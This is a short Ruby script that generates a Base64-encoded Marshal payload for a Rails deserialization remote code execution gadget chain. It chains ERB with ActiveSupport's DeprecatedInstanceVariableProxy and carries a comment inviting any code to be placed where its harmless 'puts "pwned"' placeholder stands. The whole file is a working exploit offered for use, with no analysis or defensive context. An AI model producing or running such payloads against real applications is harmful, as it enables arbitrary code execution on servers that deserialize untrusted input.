require 'yaml'
require 'base64'
require 'erb'

class ActiveSupport
  class Deprecation
    def initialize()
      @silenced = true
    end
    class DeprecatedInstanceVariableProxy
      def initialize(instance, method)
        @instance = instance
        @method = method
        @deprecator = ActiveSupport::Deprecation.new
      end
    end
  end
end

# Any RCE you want goes here
code = <<-EOS
puts "pwned"
EOS

erb = ERB.allocate
erb.instance_variable_set :@src, code
erb.instance_variable_set :@lineno, 1337

depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new erb, :result

payload = Base64.encode64(Marshal.dump(depr)).gsub("\n", "")

puts payload
